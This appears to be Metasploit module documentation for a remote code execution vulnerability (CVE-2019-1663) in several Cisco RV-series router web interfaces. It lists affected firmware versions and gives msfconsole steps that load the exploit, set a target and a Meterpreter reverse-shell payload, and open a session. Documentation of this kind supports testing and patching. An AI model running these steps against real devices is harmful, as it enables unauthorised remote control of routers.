# Cisco RV110W/RV130W/RV215W Routers Management Interface Remote Command Execution

A vulnerability in the web-based management interface of the Cisco RV110W Wireless-N VPN Firewall, Cisco RV130W Wireless-N Multifunction VPN Router, and Cisco RV215W Wireless-N VPN Router could allow an unauthenticated, remote attacker to execute arbitrary code on an affected device.

The vulnerability is due to improper validation of user-supplied data in the web-based management interface. An attacker could exploit this vulnerability by sending malicious HTTP requests to a targeted device.

A successful exploit could allow the attacker to execute arbitrary code on the underlying operating system of the affected device as a high-privilege user.

## Vulnerable Device

* RV110W Wireless-N VPN Firewall versions prior to 1.2.2.1 are affected.
* RV130 Multifunction VPN Router versions prior to 1.0.3.45 are affected.
* RV130W Wireless-N Multifunction VPN Router versions prior to 1.0.3.45 are affected.
* RV215W Wireless-N VPN Router versions prior to 1.3.1.1 are affected.

## Verification Steps

1. Start msfconsole
2. ```use exploit/linux/http/cve_2019_1663_cisco_rmi_rce```
3. ```set rhost [IP]```
4. ```set payload linux/armle/meterpreter_reverse_tcp```
5. ```set lhost [IP]```
6. ```exploit```
7. You should get a session
